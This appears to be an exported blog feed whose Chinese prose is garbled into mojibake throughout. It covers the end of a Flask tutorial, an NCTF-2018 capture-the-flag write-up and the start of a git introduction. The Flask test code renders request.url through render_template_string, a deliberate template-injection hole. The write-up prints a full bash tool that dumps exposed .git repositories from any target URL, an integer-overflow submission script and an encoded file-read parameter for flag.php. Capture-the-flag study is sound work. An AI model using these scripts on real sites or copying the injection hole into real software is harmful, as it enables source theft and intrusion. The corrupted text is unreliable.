world‰∫ÜÔºåËÆøÈóÆhttp://127.0.0.1:5000„ÄÇÂèØ‰ª•ÁúãÂà∞ÊâìÂç∞Âá∫Hello World routeË£ÖÈ•∞Âô®Ë∑ØÁî±@app.route(&apos;/&apos;)‰ΩøÁî® route() Ë£ÖÈ•∞Âô®ÂëäËØâ Flask ‰ªÄ‰πàÊ†∑ÁöÑURL ËÉΩËß¶ÂèëÊàë‰ª¨ÁöÑÂáΩÊï∞„ÄÇ route() Ë£ÖÈ•∞Âô®Êää‰∏Ä‰∏™ÂáΩÊï∞ÁªëÂÆöÂà∞ÂØπÂ∫îÁöÑ URL ‰∏äÔºåËøôÂè•ËØùÁõ∏ÂΩì‰∫éË∑ØÁî±Ôºå‰∏Ä‰∏™Ë∑ØÁî±Ë∑üÈöè‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂ¶Ç @app.route(&apos;/&apos;) def test()&quot; return 123ËÆøÈóÆ127.0.0.1:5000/ Âàô‰ºöËæìÂá∫123ÔºåÊàë‰ª¨‰øÆÊîπ‰∏Ä‰∏ãËßÑÂàô @app.route(&apos;/test&apos;) def test()&quot; return 123Ëøô‰∏™Êó∂ÂÄôËÆøÈóÆ127.0.0.1:5000/test ‰ºöËæìÂá∫123„ÄÇÊ≠§Â§ñËøòÂèØ‰ª•ËÆæÁΩÆÂä®ÊÄÅurlÔºå @app.route(&quot;/hello/&lt;username&gt;&quot;) def hello_user(username): return &quot;user:%s&quot;%usernameÊ†πÊçÆurlÈáåÁöÑËæìÂÖ•ÔºåÂä®ÊÄÅËæ®Âà´Ë∫´‰ªΩÔºåÊ≠§Êó∂‰æøÂèØ‰ª•ÁúãÂà∞Â¶Ç‰∏ãÈ°µÈù¢Ôºö ÊàñËÄÖÂèØ‰ª•‰ΩøÁî®intÂûãÔºåËΩ¨Êç¢Âô®Êúâ‰∏ãÈù¢Âá†ÁßçÔºö int Êé•ÂèóÊï¥Êï∞ float Âêå int Ôºå‰ΩÜÊòØÊé•ÂèóÊµÆÁÇπÊï∞ path ÂíåÈªòËÆ§ÁöÑÁõ∏‰ººÔºå‰ΩÜ‰πüÊé•ÂèóÊñúÁ∫ø @app.route(&apos;/post/&lt;int:post_id&gt;&apos;) def show_post(post_id): # show the post with the given id, the id is an integer return &apos;Post %d&apos; % post_idmainÂÖ•Âè£ÂΩì.pyÊñá‰ª∂Ë¢´Áõ¥Êé•ËøêË°åÊó∂Ôºåif name == ‚Äòmain‚Äò‰πã‰∏ãÁöÑ‰ª£Á†ÅÂùóÂ∞ÜË¢´ËøêË°åÔºõÂΩì.pyÊñá‰ª∂‰ª•Ê®°ÂùóÂΩ¢ÂºèË¢´ÂØºÂÖ•Êó∂Ôºåif name == ‚Äòmain‚Äò‰πã‰∏ãÁöÑ‰ª£Á†ÅÂùó‰∏çË¢´ËøêË°å„ÄÇÂ¶ÇÊûú‰Ω†ÁªèÂ∏∏‰ª•cmdÊñπÂºèËøêË°åËá™Â∑±ÂÜôÁöÑpythonÂ∞èËÑöÊú¨ÔºåÈÇ£‰πà‰∏çÈúÄË¶ÅËøô‰∏™‰∏úË•øÔºå‰ΩÜÊòØÂ¶ÇÊûúÈúÄË¶ÅÂÅö‰∏Ä‰∏™Á®çÂæÆÂ§ß‰∏ÄÁÇπÁöÑpythonÂºÄÂèëÔºåÂÜô if name ==‚Äômain__‚Äô ÊòØ‰∏Ä‰∏™ËâØÂ•ΩÁöÑ‰π†ÊÉØÔºåÂ§ß‰∏ÄÁÇπÁöÑpythonËÑöÊú¨Ë¶ÅÂàÜÂºÄÂá†‰∏™Êñá‰ª∂Êù•ÂÜôÔºå‰∏Ä‰∏™Êñá‰ª∂Ë¶Å‰ΩøÁî®Âè¶‰∏Ä‰∏™Êñá‰ª∂Ôºå‰πüÂ∞±ÊòØÊ®°ÂùóÔºåÊ≠§Êó∂Ëøô‰∏™ifÂ∞±‰ºöËµ∑Âà∞‰ΩúÁî®‰∏ç‰ºöËøêË°åËÄåÊòØÁ±ª‰ºº‰∫éÊñá‰ª∂ÂåÖÂê´Êù•‰ΩøÁî®„ÄÇ if __name__ == &apos;__main__&apos;: app.debug = True app.run()ÊµãËØïÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®debugÔºåÊñπ‰æøË∞ÉËØïÔºåÂ¢ûÂä†‰∏ÄÂè• app.debug = True ÊàñËÄÖÔºàÊïàÊûúÊòØ‰∏ÄÊ†∑ÁöÑÔºâ app.run(debug=True)ËøôÊ†∑Êàë‰ª¨‰øÆÊîπ‰ª£Á†ÅÁöÑÊó∂ÂÄôÁõ¥Êé•‰øùÂ≠òÔºåÁΩëÈ°µÂà∑Êñ∞Â∞±ÂèØ‰ª•‰∫ÜÔºåÂ¶ÇÊûú‰∏çÂä†debugÔºåÈÇ£‰πàÊØèÊ¨°‰øÆÊîπ‰ª£Á†ÅÈÉΩË¶ÅËøêË°å‰∏ÄÊ¨°Á®ãÂ∫èÔºåÂπ∂‰∏îÊääÂâç‰∏Ä‰∏™Á®ãÂ∫èÂÖ≥Èó≠„ÄÇÂê¶Âàô‰ºöË¢´Ââç‰∏Ä‰∏™Á®ãÂ∫èË¶ÜÁõñ„ÄÇ app.run(host=&apos;0.0.0.0&apos;)Ëøô‰ºöËÆ©Êìç‰ΩúÁ≥ªÁªüÁõëÂê¨ÊâÄÊúâÂÖ¨ÁΩë IP,Ê≠§Êó∂‰æøÂèØ‰ª•Âú®ÂÖ¨ÁΩë‰∏äÁúãÂà∞Ëá™Â∑±ÁöÑweb„ÄÇ httpËØ∑Ê±ÇÊñπÊ≥ïÈ°µÈù¢ÈúÄË¶ÅgetËØ∑Ê±ÇÊàñËÄÖpostËØ∑Ê±Ç‰πüÂèØ‰ª•Áî±Ë∑ØÁî±Êù•Ëß£ÂÜ≥ÔºåÈÄöËøá route() Ë£ÖÈ•∞Âô®‰º†ÈÄí methods ÂèÇÊï∞„ÄÇÂ¶ÇÊàë‰ª¨Ë¶ÅÂú®ÁôªÂΩïÈ°µÈù¢‰ΩøÁî®getÊàñËÄÖpostÁôªÂΩïËæìÂÖ•„ÄÇ @app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;]) def login(): if request.method == &apos;POST&apos;: do_the_login() else: show_the_login_form()Ê®°ÁâàÊ∏≤Êüì‰Ωï‰∏∫Ê®°ÁâàÊ∏≤Êüì ÁÇπÂáªËøûÊé•‚Äî&gt;&gt;&gt; https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ ‰Ω†ÂèØ‰ª•‰ΩøÁî® render_template() ÊñπÊ≥ïÊù•Ê∏≤ÊüìÊ®°Êùø„ÄÇ‰Ω†ÈúÄË¶ÅÂÅöÁöÑ‰∏ÄÂàáÂ∞±ÊòØÂ∞ÜÊ®°ÊùøÂêçÂíå‰Ω†ÊÉ≥‰Ωú‰∏∫ÂÖ≥ÈîÆÂ≠óÁöÑÂèÇÊï∞‰º†ÂÖ•Ê®°ÊùøÁöÑÂèòÈáè„ÄÇËøôÈáåÊúâ‰∏Ä‰∏™Â±ïÁ§∫Â¶Ç‰ΩïÊ∏≤ÊüìÊ®°ÊùøÁöÑÁÆÄ‰æã: ÁÆÄÂçïÁöÑÊ®°ÁâàÊ∏≤ÊüìÁ§∫‰æã from flask import render_template @app.route(&apos;/hello/&apos;) @app.route(&apos;/hello/&lt;name&gt;&apos;) def hello(name=None): return render_template(&apos;hello.html&apos;, name=name)flaskÁÆÄÂçïÂÆû‰æãÊàë‰ª¨‰ªéÊ®°ÊùøÊ∏≤ÊüìÂºÄÂßãÂÆû‰æãÔºåÂõ†‰∏∫Êàë‰ª¨ÊØïÁ´ü‰∏çÊòØÂÅöÂºÄÂèëÁöÑÔºåflask‰ª•Ê®°ÊùøÊ≥®ÂÖ•ÈóªÂêçÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖà‰ªéflaskÊ®°ÁâàÊ∏≤ÊüìÂÖ•ÊâãÊ∑±ÂÖ•ÂâñÊûê„ÄÇ È¶ñÂÖàË¶ÅÊêûÊ∏ÖÊ•öÔºåÊ®°ÊùøÊ∏≤Êüì‰ΩìÁ≥ªÔºårender_templateÂáΩÊï∞Ê∏≤ÊüìÁöÑÊòØtemplates‰∏≠ÁöÑÊ®°ÊùøÔºåÊâÄË∞ìÊ®°ÊùøÊòØÊàë‰ª¨Ëá™Â∑±ÂÜôÁöÑhtmlÔºåÈáåÈù¢ÁöÑÂèÇÊï∞ÈúÄË¶ÅÊàë‰ª¨Ê†πÊçÆÊØè‰∏™Áî®Êà∑ÈúÄÊ±Ç‰º†ÂÖ•Âä®ÊÄÅÂèòÈáè„ÄÇ ‚îú‚îÄ‚îÄ app.py ‚îú‚îÄ‚îÄ static ‚îÇ ‚îî‚îÄ‚îÄ style.css ‚îî‚îÄ‚îÄ templates ‚îî‚îÄ‚îÄ index.html Êàë‰ª¨ÂÜô‰∏Ä‰∏™index.htmlÊñá‰ª∂ÂÜôtemplatesÊñá‰ª∂Â§π‰∏≠„ÄÇ &lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - Â∞èÁå™‰Ω©Â•á&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;ÈáåÈù¢Êúâ‰∏§‰∏™ÂèÇÊï∞ÈúÄË¶ÅÊàë‰ª¨Ê∏≤ÊüìÔºåuser.nameÔºå‰ª•Âèätitle Êàë‰ª¨Âú®app.pyÊñá‰ª∂ÈáåËøõË°åÊ∏≤Êüì„ÄÇ @app.route(&apos;/&apos;) @app.route(&apos;/index&apos;)#Êàë‰ª¨ËÆøÈóÆ/ÊàñËÄÖ/indexÈÉΩ‰ºöË∑≥ËΩ¨ def index(): user = {&apos;name&apos;: &apos;Â∞èÁå™‰Ω©Â•á&apos;}#‰º†ÂÖ•‰∏Ä‰∏™Â≠óÂÖ∏Êï∞ÁªÑ return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=user) ËøôÊ¨°Ê∏≤ÊüìÊàë‰ª¨Ê≤°Êúâ‰ΩøÁî®Áî®Êà∑ÂèØÊéßÔºåÊâÄ‰ª•ÊòØÂÆâÂÖ®ÁöÑÔºåÂ¶ÇÊûúÊàë‰ª¨‰∫§ÁªôÁî®Êà∑ÂèØÊéßÂπ∂‰∏î‰∏çËøáÊª§ÂèÇÊï∞Â∞±ÊúâÂèØËÉΩÈÄ†ÊàêSSTIÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇjinja2Ê®°ÊùøÂêåÊ†∑ÊîØÊåÅÊéßÂà∂ËØ≠Âè•ÔºåÂú®ÔΩõ% %ÔΩù‰∏≠ËæìÂÖ•Êàë‰ª¨ÁöÑ‰ª£Á†Å„ÄÇÂ¶Ç {% if title %} {{title}} - xzpq {% else %} Welcome to xzpq {% endif %}Â¶ÇÊûú‰º†ÂÖ•titleÂèÇÊï∞ÈÇ£‰πàÊâßË°å &lt;title&gt;{{title}} - xzpq&lt;/title&gt; Âê¶ÂàôÊâßË°å &lt;title&gt;Welcome to xzpq&lt;/title&gt; ÊúÄÂêéÊâßË°å‰∏ãÈù¢Êú™ÂÜôÂá∫„ÄÇ Êú¨ÊñáÊöÇ‰∏îÂà∞ËøôÈáåÔºå‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜÈÖçÂêàsstiÊ®°ÊùøÊ≥®ÂÖ•ËÄå‰∫ÜËß£flaskÊ≥®ÂÖ•„ÄÇÁúãÁªßÁª≠ÂèÇËÄÉÂçöÊñáSSTIÊ®°ÊùøÊ≥®ÂÖ•„ÄÇ ÊµãËØïÁöÑ‰ª£Á†ÅË¥¥‰∏ä from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;]) def login(): if request.method == &apos;POST&apos;: do_the_login() else: show_the_login_form() @app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) @app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#Êàë‰ª¨ËÆøÈóÆ/ÊàñËÄÖ/indexÈÉΩ‰ºöË∑≥ËΩ¨ def index(): return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;)) @app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) def test(): template = &apos;&apos;&apos; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &apos;&apos;&apos; %(request.url) return render_template_string(template) if __name__ == &apos;__main__&apos;: app.debug = True app.run() ÂèÇËÄÉÔºöhttp://www.pythondoc.com/flask-mega-tutorial/]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂçóÈÇÆCTF-2018]]></title>
    <url>%2F2018%2F12%2F06%2F%E5%8D%97%E9%82%AECTF-2018%2F</url>
    <content type="text"><![CDATA[ÂÖ®ÁêÉÊúÄÂ§ß‰∫§ÂèãÁΩëÁ´ôËøõÂÖ•ÁΩëÁ´ôÊòØ‰∏Ä‰∏™Êó∂Èíü„ÄÇÂπ∂Ê≤°‰ªÄ‰πàÊÄùË∑ØÔºåÂè™ËÉΩÊãøÂ∑•ÂÖ∑Êâ´‰∏Ä‰∏ã‰∫Ü„ÄÇ.gitÁ¶ÅÊ≠¢ËÆøÈóÆÔºåÂèØËÉΩÂ≠òÂú®gitÊ∫êÁ†ÅÊ≥ÑÈú≤„ÄÇÁî®lijiejieÁöÑÂ∑•ÂÖ∑Ôºå‰∏ãËΩΩÊ∫êÁ†ÅÂèëÁé∞Ê≤°Âï•‰π±Áî®Ôºå‰∏Ä‰∏™readme.txt„ÄÇÊú¨Êù•Ê≤°ÊÉ≥ÁÇπËøõÂéªÔºåÂèëÁé∞Á°ÆÂÆûÊúâÊèêÁ§∫ Allsource files areingit tag1.0 ËøôÊÑèÊÄùÊòØÊâÄÊúâÁöÑÊ∫êÁ†ÅÈÉΩÂú® tag1.0‰∏≠Ôºå‰πüÂ∞±ÊòØ‰∏çÂú®Ëøô‰∏™ÁâàÊú¨‰∏≠„ÄÇ‰πüÂ∞±ÊòØËØ¥Ëøô‰∏™ÁâàÊú¨‰ªñÊää‰ªìÂ∫ì‰∏úË•øÁªôÂà†Èô§‰∫ÜÔºå‰Ω†Â¶ÇÊûúÊÉ≥Ë¶Å1.0ÁâàÊú¨ÂøÖÈ°ªË¶ÅÂõûÊ∫ØÂà∞1.0ÁâàÊú¨„ÄÇ‰∏çËøáÊó¢ÁÑ∂Êúâ.gitÊåâÈÅìÁêÜËØ¥ÈÉΩÊòØÂèØ‰ª•ÁúãÂà∞ÁöÑ„ÄÇ‰∏Ä‰∏™Â∑•ÂÖ∑ÁªôÂ§ßÂÆ∂„ÄÇ #!/bin/bash # # Author: Denny Huang &lt;denny0223@gmail.com&gt; # Wed Sep 17 2014 # MIT License function downloadBlob { echo downloadBlob $1 mkdir -p ${1:0:2} cd $_ wget -q -nc $domain/.git/objects/${1:0:2}/${1:2} cd .. } function parseTree { echo parseTree $1 downloadBlob $1 while read line do type=$(echo $line | awk &apos;{print $2}&apos;) hash=$(echo $line | awk &apos;{print $3}&apos;) [ &quot;$type&quot; = &quot;tree&quot; ] &amp;&amp; parseTree $hash || downloadBlob $hash done &lt; &lt;(git cat-file -p $1) } function parseCommit { echo parseCommit $1 downloadBlob $1 tree=$(git cat-file -p $1| sed -n &apos;1p&apos; | awk &apos;{print $2}&apos;) parseTree $tree parent=$(git cat-file -p $1 | sed -n &apos;2p&apos; | awk &apos;{print $2}&apos;) [ ${#parent} -eq 40 ] &amp;&amp; parseCommit $parent } [ -z $1 ] &amp;&amp; echo -e &quot;missing target url\n\n\ Usage: scrabble &lt;url&gt;\n\ Example: scrabble http://example.com/\n\n\ You need make sure target url had .git folder&quot;\ &amp;&amp; exit domain=$1 ref=$(curl -s $domain/.git/HEAD | awk &apos;{print $2}&apos;) lastHash=$(curl -s $domain/.git/$ref) git init cd .git/objects/ parseCommit $lastHash cd ../../ echo $lastHash &gt; .git/refs/heads/master git reset --hardÁî®Ê≥ïÂ¶ÇÂõæÊ≥®ÊÑè scrabble ÊòØÊàë‰∏äÈù¢ËÑöÊú¨ÁöÑÂêçÂ≠ó„ÄÇÊó†ÈúÄÂêéÁºÄÔºåË¶ÅÂú®linux bashËøêË°å ‰πãÂêé‰æøÂèØ‰ª•ÂΩì‰ΩúËá™Â∑±ÁöÑgit‰ªìÂ∫ìÊù•‰ΩøÁî®„ÄÇÂ¶Ç git log ‰∏äÈù¢ÊòØÊàëÊú¨Âú∞ÊµãËØïËá™Â∑±ÁöÑ‰ª£Á†Å„ÄÇÊàë‰ª¨ÂõûÂΩíÊ≠£È¢ò„ÄÇÂõ†‰∏∫È¢òÁõÆÂ∑≤ÁªèÂÖ≥‰∫ÜÔºåÊ≤°Ê≥ïÂ§çÁé∞È¢òÁõÆ‰∏≠ÁöÑgit,ÊÑèÊÄùÂ∞±ÊòØgit logÔºåÊü•ÁúãÂà∞ÂêÑ‰∏™ÁâàÊú¨ÁöÑÁâàÊú¨Âè∑ÔºåÁÑ∂Âêé git show HEAD ÁâàÊú¨Âè∑Êü•ÁúãËøõË°å‰∫Ü‰ªÄ‰πà‰øÆÊîπÂ¢ûÂä†‰æøÂèØ‰ª•ÁúãÂà∞flag„ÄÇ root@xiaozhupeiqi:/scrabble# git show HEAD cf36b7a28707d581e4c5be4a2061ad41c9d386e2 Â∞èÁªøËçâ‰πãÊúÄÂº∫Â§ßËÑë ÂâçË®ÄÔºöÊØîËµõÁªìÊùüÂêéÊµãËØïÁöÑÔºåËá™ÊàëËÆ§‰∏∫ÊòØÁéØÂ¢ÉÈóÆÈ¢òÔºå‰ΩøÁî®Âà´‰∫∫ÁöÑpoc‰πüË∑ë‰∏çÂá∫Êù•flagÔºåÂ∞±ÂΩìËá™Â∑±ÁªÉ‰π†ËÑöÊú¨‰∫Ü„ÄÇ ÂÖàË¥¥Âá∫ËÑöÊú¨Ëá™ÂÜôÔºàÊú™È™åËØÅÂáÜÁ°ÆÊÄßÔºâ import requests import re import time url=&apos;http://127.0.0.1/2/index.php&apos; s=requests.Session() r=s.get(url) while(1): a = r.content[1600:4250].decode(encoding=&apos;utf-8&apos;) matchp = re.findall(r&apos;[0-9\+\-\*]&apos;,a) a=&quot;&quot; for i in matchp: a=a+i b=&quot;&quot; map=re.findall(r&apos;[1-9]+[0]*[1-9]+[0]*[1-9]+[0]*[1-9]+[\+\-\*]*&apos;,a) for i in map: b=b+i b=&apos;9223372036854775807+&apos;+b print b print eval(b) c=eval(b) payload={&apos;input&apos;:&apos;1111111111111111111111&apos;,&apos;ans&apos;:c} r=s.post(url,data=payload) time.sleep(1.5) print r.content.decode(encoding=&apos;utf-8&apos;)ÂàÜÊûêÔºöÊ≠§È¢ò‰∏≠‰∏ÄÁúãÂú∫Èù¢Â∫îËØ•ÊòØËá™ÂÜôËÑöÊú¨ÁÑ∂ÂêéËÆ°ÁÆóÁªìÊûúÂø´ÈÄüÊèê‰∫§„ÄÇ‰ΩÜÊòØËÇØÂÆö‰ºöÊúâËÄÉÂÖ∂‰ªñÁöÑÁü•ËØÜÁÇπ„ÄÇ‰ª•ÂêéÁúãÂà∞ctfÂÖàÊâ´‰∏ÄÊ≥¢ÔºåÊâ´Âà∞Ê∫êÁ†Å Ê∫êÁ†Å‰∏≠Êúâ‰∏ÄÂæàÈáçË¶ÅÁöÑÁü•ËØÜÁÇπÁü•ËØÜÁÇπ 1 if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;]){intval ÊòØÈò≤Ê≠¢Á®ãÂ∫èÊ∫¢Âá∫ÁöÑÂáΩÊï∞Ôºå32‰ΩçÁ≥ªÁªüÊ∫¢Âá∫ÊúÄÂ§ßÔºö2147483647 64‰ΩçÁ≥ªÁªüÊ∫¢Âá∫ÊúÄÂ§ßÔºö9223372036854775807ÔºåÊ£ÄÊµã‰∏∫64‰ΩçÁ≥ªÁªüÔºåÊâÄ‰ª•‰Ω†Êèê‰∫§22‰ΩçÁöÑÊï∞Â≠ó‰ºöËá™Âä®ËΩ¨Âåñ‰∏∫ 9223372036854775807ÔºåÊâÄ‰ª•ËÑöÊú¨ËÆ°ÁÆóÁöÑÊó∂ÂÄôË¶Å‰ΩøÁî® 9223372036854775807 ËÄå‰∏çÊòØ22‰ΩçËá™Â∑±inputÁöÑÊï∞Â≠ó„ÄÇ Áü•ËØÜÁÇπ2 if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1){ session_destroy(); echo &apos; &lt;script language=&quot;javascript&quot;&gt; alert(&quot;‰Ω†ÊâãÈÄüÂ§™Âø´Âï¶ÔºåÊúçÂä°Âô®ÊâøÂèó‰∏ç‰Ωè!!!&quot;); window.history.back(-1); &lt;/script&gt; &apos;; }Ê∫êÁ†Å‰∏≠ÊåáÂÆö‰∏çËÉΩÊèê‰∫§ÈÄüÂ∫¶Â§™Âø´ÔºåÂú®github‰∏ä‰∏ãËΩΩÁöÑÊâÄÊúâÊ∫êÁ†ÅËßÑÂÆöÁöÑÊòØÂ¶ÇÊûú‰Ω†Êèê‰∫§‰∫îÊ¨°Ê≠£Á°ÆÁ≠îÊ°àÂ∞±Áªô‰Ω†flagÔºå‰ΩÜÊòØ‰Ω†‰∏çËÉΩÊèê‰∫§Â§™Âø´ÔºåÊàë‰ª¨‰ΩøÁî®ÂáΩÊï∞time.sleep(1.5)ÔºåÂÆö‰πâ1.5S Êèê‰∫§‰∏ÄÊ¨°„ÄÇ Áü•ËØÜÁÇπ3 Ê≠£ÂàôÔºåÊàëÊòØÊ≤°ÂÜôËøáÂá†Ê¨°Ê≠£ÂàôÁöÑÔºåÊâÄ‰ª•ÂÜôÁöÑÂæàËæ£È∏°ÔºåÊòØÁúüÁöÑËæ£È∏°ÔºåÂåπÈÖçÊúâÁÇπÈ∏°ËÇãÔºåËØ¥‰∏çÊ∏ÖËá™Â∑±‰Ωì‰ºöÊää„ÄÇ„ÄÇ Áü•ËØÜÁÇπ4 ÂøÖÈ°ªË¶ÅÂÅö‰∏Ä‰∏™sessionÔºåÂõ†‰∏∫ÈúÄË¶Å‰∏Ä‰∏™Áî®Êà∑Êèê‰∫§‰∫îÊ¨°Âèä‰ª•‰∏ä„ÄÇ Áü•ËØÜÁÇπ5 findallÂáΩÊï∞Ë¶ÅÂ≠¶Ê∏ÖÊ•öÔºåÁªÜÂøÉÔºÅÂ∞±ÂÆå‰∫ã„ÄÇ ËÑöÊú¨ËøêË°åÊà™Âõæ ‰∏çË¶ÅÈóÆÊàë‰∏∫‰ªÄ‰πàÊ≤°ÁÆóÂØπÔºåÂ∫îËØ•ÊòØÁõ¥Êé•‰∏ãËΩΩÊ∫êÁ†ÅÁéØÂ¢É‰∏çÂØπÔºåÁÆóÊòØËÇØÂÆöÁÆóÂØπ‰∫ÜÁöÑÔºåÁΩë‰∏ä‰∏ãËΩΩÁöÑpoc‰πüÂêåÊ†∑Ê≤°Ë∑ëÂá∫Êù•flagÔºåÂ∫îËØ•ÊòØÁéØÂ¢ÉÂóØÔºåÁéØÂ¢ÉÈóÆÈ¢ò„ÄÇ Go LakersËøõÂéª‰πãÂêéÂèëÁé∞ÁΩëÁ´ôË∑≥ËΩ¨302ÔºåÊäìÂåÖÔºåÁúãÂà∞ÊúÄ‰∏ãÈù¢ÔºåÔºàÊàëÂèëÁé∞CTF‰∏çÁªÜÂøÉÁöÑ‰∫∫ÂÅö‰∏çÂá∫Êù•Ëøò‰ºöÂéüÂú∞ÁàÜÁÇ∏Ôºâ post ‰∏Ä‰∏™ viewsourceÂèÇÊï∞Â∞±Â•ΩÁúãÂà∞Ê∫êÁ†Å if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;]))){ header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;); }else{ echo &apos;great&apos;; }ËøôÁé©ÊÑèÊòØ**È™ó‰∫∫ÁöÑÔºå‰∏çÁî®ÁªïÊàëÊó•ÔºÅËá™Â∑±‰Ωì‰ºö„ÄÇÂà©Áî®ÊúÄÂêé‰∏ÄÂè•Ê∫êÁ†Å Â∞±ÊòØËØªÂèñÊñá‰ª∂Â∞±ÂÆå‰∫ã echo file_get_contents(de_code($_GET[&apos;file_&apos;]));Â∞ÜfunctionÈÄÜÂêëÁºñÂÜôÔºåÁÑ∂ÂêéÈ°∫ÁêÜÊàêÁ´†ÁöÑ‰∏ãÈù¢Â∞±‰ºöËØªÂèñÊñá‰ª∂„ÄÇflag.phpÂ∞±Âú®ÂΩìÂâçÊñá‰ª∂‰∏ãÔºåÁõ¥Êé•ËØªÂ∞±Ë°å‰∫Ü ÈÄÜÂêë‰ª£Á†Å for($i=0;$i&lt;strlen($value);$i++){ $result .= chr(ord($value[$i])+$i*2); } $result=base64_encode($result); echo $result;valueËæìÂÖ•ÊÉ≥ËØªÁöÑÊñá‰ª∂ËæìÂÖ•flag.php ËΩ¨Êç¢ÊàêZm5lbTZ6dH4=ÁÑ∂ÂêéÊèê‰∫§file_=Zm5lbTZ6dH4=Â∞±ÂèØËØªÂèñflag.phpÂçÉ‰∏á‰∏çË¶ÅË¢´È™ó‰∫ÜÔºåÂì≠‰∫ÜÔºÅ]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git‰ΩøÁî®‰∏éÈÉ®ÁΩ≤github]]></title>
    <url>%2F2018%2F12%2F04%2Fgit%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[GITÊòØ‰ªÄ‰πàGITÊòØÂÖàËøõÁöÑÂàÜÂ∏ÉÂºèÁâàÊú¨ÊéßÂà∂Á≥ªÁªüÔºåÊó¢ÁÑ∂ÊòØÂàÜÂ∏ÉÂºèÊéßÂà∂Á≥ªÁªüÔºåÈÇ£‰πàÂ∞±ÊòØÊ≤°Êúâ‰∏≠Â§ÆÊúçÂä°Âô®ÁöÑÔºåÊØè‰∏™ÁªàÁ´ØÈÉΩÂèØ‰ª•ÊòØ‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÂ∫ìÔºåÂ¶ÇÊûúÂÆ∂Â∫≠Âçï‰Ωç‰∏§Âè∞ÁîµËÑëÂ¶Ç‰Ωï‰øÆÊîπÂ∫ìÂë¢ÔºåÂè™ÈúÄË¶ÅÊé®ÈÄÅÁªôÂØπÊñπËøõË°å‰øÆÊîπÂç≥ÂèØ„ÄÇÊó¢ÁÑ∂ÊòØÂàÜÂ∏ÉÂºèÔºåÊØèÂè∞ÁîµËÑëÂ∞±ÂèØ‰ª•ÊòØ‰∏Ä‰∏™Â∫ìÈÇ£‰πà‰πüÂ∞±Ëá™ÁÑ∂‰∏çÈúÄË¶ÅËøûÊé•ÊúçÂä°Âô®ËøõË°å‰∏ä‰º†‰∫ÜÔºå‰∏çËøáÊé•‰∏ãÊù•Êàë‰ª¨Ë¶Å‰ªãÁªçÂà∞‰∏ä‰º†github‰∏ä„ÄÇ gitÊúâ‰ªÄ‰πàÂ•ΩÂ§ÑgitÊúÄÂ§ßÁöÑÂ•ΩÂ§ÑÂ∞±ÊòØÊñπ‰æøÔºåÂ•ΩÂêßÔºåÂ¶Ç‰ΩïÊñπ‰æøÂë¢Ôºå‰ªñÂèØ‰ª•Ëá™Áî±ÂõûÈÄÄÂêÑ‰∏™ÁâàÊú¨ÔºåÂ∞±ÊòØ‰Ω†ÂØπ‰∏Ä‰∏™Â∫ìÁöÑ‰ªª‰Ωï‰øÆÊîπ‰ªñÈÉΩ‰ºö‰øùÂ≠òÔºåÂ¶ÇÊûú‰Ω†Áî®‰∏çÂà∞ÈÇ£‰πàÂèØ‰ª•‰∏çÁî®Áü•ÈÅì‰ªñÁöÑÂ≠òÂú®ÔºåÂ¶ÇÊûú‰Ω†ÈúÄË¶ÅÔºå‰ªñÂèØ‰ª•Ë∞ÉÁî®Âá∫Êù•‰Ω†‰ª•ÂâçÁöÑÁâàÊú¨„ÄÇ‰∏æ‰∏™‰æãÂ≠ê„ÄÇ 